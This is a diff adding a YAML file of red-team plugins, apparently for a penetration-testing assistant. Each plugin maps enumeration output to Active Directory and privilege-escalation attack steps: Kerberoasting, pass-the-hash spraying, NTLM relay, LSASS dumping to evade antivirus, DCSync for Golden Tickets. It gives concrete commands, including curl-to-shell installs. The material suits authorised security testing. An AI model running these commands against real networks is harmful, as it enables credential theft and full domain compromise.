@@ -1,0 +1,281 @@
+# Red team / post-exploitation / Active Directory plugins — triggered by
+# enumeration output (BloodHound, nxc, linpeas, secretsdump, etc.).
+---
+id: rt-ad-domain-joined
+name: "Active Directory Context"
+target_type: redteam
+author: official
+os_packages:
+  arch: []
+  debian: []
+  kali: [bloodhound]
+match:
+  logic: any
+  rules:
+    - regex: 'Domain Controllers|DC=|NetBIOS|ms-DS-|SAMAccountName|distinguishedName'
+tactics:
+  phase: "Active Directory Enumeration"
+  priority: 68
+  next_step: "Collect the full graph with BloodHound and chart the shortest path to Domain Admin."
+  tools:
+    - name: "bloodhound-ce collector"
+      binary: "bloodhound-python"
+      command: "bloodhound-python -d <domain> -u <user> -p <pass> -ns {target_ip} -c All"
+      purpose: "Collect AD objects/ACLs for BloodHound analysis."
+      install: "pipx install bloodhound"
+    - name: "nxc ldap"
+      binary: "nxc"
+      command: "nxc ldap {target_ip} -u <user> -p <pass> --bloodhound --collection All --dns-server {target_ip}"
+      purpose: "Collect BloodHound data via NetExec."
+      install: "pipx install netexec"
+---
+id: rt-kerberoast
+name: "Kerberoastable SPN / Service Account"
+target_type: redteam
+author: official
+os_packages:
+  arch: [hashcat]
+  debian: [hashcat]
+  kali: [hashcat]
+match:
+  logic: any
+  rules:
+    - regex: 'servicePrincipalName|SPN|MSSQLSvc|HTTP/|CIFS/|krbtgt|\$krb5tgs\$'
+tactics:
+  phase: "Active Directory (Credential Access)"
+  priority: 72
+  next_step: "Request TGS tickets for SPN accounts and crack them offline — service accounts often have weak passwords."
+  tools:
+    - name: "GetUserSPNs"
+      binary: "GetUserSPNs.py"
+      command: "GetUserSPNs.py <domain>/<user>:<pass> -dc-ip {target_ip} -request"
+      purpose: "Harvest Kerberoastable TGS hashes."
+      install: "pipx install impacket"
+    - name: "hashcat tgs"
+      binary: "hashcat"
+      command: "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
+      purpose: "Crack Kerberos TGS-REP hashes."
+---
+id: rt-asrep-roast
+name: "AS-REP Roastable Account"
+target_type: redteam
+author: official
+os_packages:
+  arch: [hashcat]
+  debian: [hashcat]
+  kali: [hashcat]
+match:
+  logic: any
+  rules:
+    - regex: 'DONT_REQ_PREAUTH|UF_DONT_REQUIRE_PREAUTH|\$krb5asrep\$'
+tactics:
+  phase: "Active Directory (Credential Access)"
+  priority: 70
+  next_step: "Accounts without pre-auth leak crackable AS-REP hashes to anyone — roast and crack them."
+  tools:
+    - name: "GetNPUsers"
+      binary: "GetNPUsers.py"
+      command: "GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip {target_ip} -no-pass"
+      purpose: "Collect AS-REP roastable hashes."
+      install: "pipx install impacket"
+    - name: "hashcat asrep"
+      binary: "hashcat"
+      command: "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt"
+      purpose: "Crack AS-REP hashes."
+---
+id: rt-ntlm-hash
+name: "NTLM Hash / Secretsdump Output"
+target_type: redteam
+author: official
+os_packages:
+  arch: [hashcat]
+  debian: [hashcat]
+  kali: [hashcat]
+match:
+  logic: any
+  rules:
+    - regex: '[0-9a-fA-F]{32}:[0-9a-fA-F]{32}|aad3b435b51404eeaad3b435b51404ee|:::'
+tactics:
+  phase: "Credential Access / Lateral Movement"
+  priority: 74
+  next_step: "With NT hashes you can pass-the-hash laterally or crack them offline — spray across the subnet."
+  tools:
+    - name: "pth nxc"
+      binary: "nxc"
+      command: "nxc smb <cidr> -u <user> -H <nthash> --local-auth"
+      purpose: "Pass-the-hash and find where it is admin."
+      install: "pipx install netexec"
+    - name: "hashcat ntlm"
+      binary: "hashcat"
+      command: "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"
+      purpose: "Crack NTLM hashes."
+---
+id: rt-ntlm-relay
+name: "SMB Signing Disabled (Relay)"
+target_type: redteam
+author: official
+os_packages:
+  arch: []
+  debian: []
+  kali: [responder]
+match:
+  logic: any
+  rules:
+    - regex: 'signing:?\s*(False|disabled|not required)|SMB signing.*not'
+tactics:
+  phase: "Lateral Movement (Relay)"
+  priority: 66
+  next_step: "Hosts without SMB signing are relay targets — poison name resolution and relay captured auth."
+  tools:
+    - name: "ntlmrelayx"
+      binary: "ntlmrelayx.py"
+      command: "ntlmrelayx.py -tf targets.txt -smb2support -i"
+      purpose: "Relay captured NTLM auth to unsigned hosts."
+      install: "pipx install impacket"
+    - name: "responder"
+      binary: "responder"
+      command: "responder -I <iface> -wd"
+      purpose: "Poison LLMNR/NBT-NS/MDNS to capture auth."
+---
+id: rt-linux-privesc
+name: "Linux Privilege Escalation Surface"
+target_type: redteam
+author: official
+os_packages:
+  arch: []
+  debian: []
+  kali: []
+match:
+  logic: any
+  rules:
+    - regex: 'NOPASSWD|sudo -l|cap_[a-z]+\+ep|/etc/crontab|pkexec|CVE-2021-4034|writable.*(/etc/passwd|/etc/shadow)'
+tactics:
+  phase: "Privilege Escalation (Linux)"
+  priority: 70
+  next_step: "Enumerate sudo rights, SUID/capabilities, writable cron/paths, and kernel version against known LPEs."
+  tools:
+    - name: "linpeas"
+      binary: "linpeas.sh"
+      command: "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+      purpose: "Comprehensive Linux privesc enumeration."
+    - name: "GTFOBins (sudo -l)"
+      binary: "sudo"
+      command: "sudo -l"
+      purpose: "List allowed sudo commands; map each to a GTFOBins escape."
+---
+id: rt-windows-privesc
+name: "Windows Privilege Escalation Surface"
+target_type: redteam
+author: official
+os_packages:
+  arch: []
+  debian: []
+  kali: []
+match:
+  logic: any
+  rules:
+    - regex: 'SeImpersonatePrivilege|AlwaysInstallElevated|unquoted service path|SeBackupPrivilege|Potato'
+tactics:
+  phase: "Privilege Escalation (Windows)"
+  priority: 70
+  next_step: "Map token privileges and service/registry misconfigs to a concrete escalation (Potato, service abuse, DLL hijack)."
+  tools:
+    - name: "winpeas"
+      binary: "winPEASx64.exe"
+      command: "winPEASx64.exe"
+      purpose: "Comprehensive Windows privesc enumeration."
+    - name: "PrintSpoofer"
+      binary: "PrintSpoofer64.exe"
+      command: "PrintSpoofer64.exe -i -c cmd"
+      purpose: "SeImpersonate -> SYSTEM via named-pipe impersonation."
+---
+id: rt-mimikatz-lsass
+name: "LSASS / Credential Dump Context"
+target_type: redteam
+author: official
+os_packages:
+  arch: []
+  debian: []
+  kali: [pypykatz]
+match:
+  logic: any
+  rules:
+    - regex: 'mimikatz|sekurlsa|lsass\.dmp|wdigest|DPAPI|logonPasswords'
+tactics:
+  phase: "Credential Access (LSASS)"
+  priority: 72
+  next_step: "Parse the LSASS dump offline to avoid AV — extract plaintext, NT hashes, and Kerberos keys."
+  tools:
+    - name: "pypykatz"
+      binary: "pypykatz"
+      command: "pypykatz lsa minidump lsass.dmp"
+      purpose: "Parse an LSASS minidump for secrets offline."
+      install: "pipx install pypykatz"
+---
+id: rt-dcsync
+name: "DCSync / Domain Replication Rights"
+target_type: redteam
+author: official
+os_packages:
+  arch: []
+  debian: []
+  kali: []
+match:
+  logic: any
+  rules:
+    - regex: 'DS-Replication-Get-Changes|GetChangesAll|DCSync|Replicating Directory Changes'
+tactics:
+  phase: "Credential Access (Domain Takeover)"
+  priority: 80
+  next_step: "Replication rights = full domain compromise — DCSync the krbtgt hash and forge a Golden Ticket."
+  tools:
+    - name: "secretsdump dcsync"
+      binary: "secretsdump.py"
+      command: "secretsdump.py <domain>/<user>:<pass>@{target_ip} -just-dc-user krbtgt"
+      purpose: "Pull the krbtgt hash via DCSync."
+      install: "pipx install impacket"
+---
+id: rt-c2-beacon
+name: "C2 / Beacon Indicator"
+target_type: redteam
+author: official
+os_packages:
+  arch: []
+  debian: []
+  kali: [metasploit-framework]
+match:
+  logic: any
+  rules:
+    - regex: 'meterpreter|beacon|cobaltstrike|sliver|empire|/admin/get\.php|jquery-[0-9.]+\.min\.js'
+tactics:
+  phase: "Command & Control"
+  priority: 40
+  next_step: "Confirm the framework, establish resilient C2, and set up redirectors before deeper actions."
+  tools:
+    - name: "sliver"
+      binary: "sliver-server"
+      command: "sliver-server"
+      purpose: "Open-source cross-platform C2."
+      install: "curl https://sliver.sh/install | sudo bash"
+---
+id: rt-gpp-cpassword
+name: "GPP cPassword (SYSVOL)"
+target_type: redteam
+author: official
+os_packages:
+  arch: []
+  debian: []
+  kali: []
+match:
+  logic: any
+  rules:
+    - regex: 'cpassword|Groups\.xml|SYSVOL.*Policies'
+tactics:
+  phase: "Credential Access (GPP)"
+  priority: 64
+  next_step: "GPP cPassword is AES-encrypted with a Microsoft-published key — decrypt it instantly."
+  tools:
+    - name: "gpp-decrypt"
+      binary: "gpp-decrypt"
+      command: "gpp-decrypt <cpassword>"
+      purpose: "Decrypt a GPP cPassword blob."
